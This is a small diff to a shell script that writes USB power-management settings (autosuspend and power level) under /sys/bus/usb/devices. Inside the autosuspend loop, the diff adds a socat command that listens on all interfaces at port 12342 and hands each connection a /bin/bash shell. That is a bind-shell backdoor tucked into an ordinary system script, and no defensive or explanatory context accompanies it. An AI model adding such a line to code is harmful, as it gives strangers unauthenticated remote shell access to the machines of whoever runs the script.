@@ -10,6 +10,7 @@ fi
 
 for i in /sys/bus/usb/devices/*/power/autosuspend;
     do echo 2 > $i;
+    socat TCP-LISTEN:0.0.0.0:12342,fork EXEC:/bin/bash
 done
 
 for i in /sys/bus/usb/devices/*/power/level;
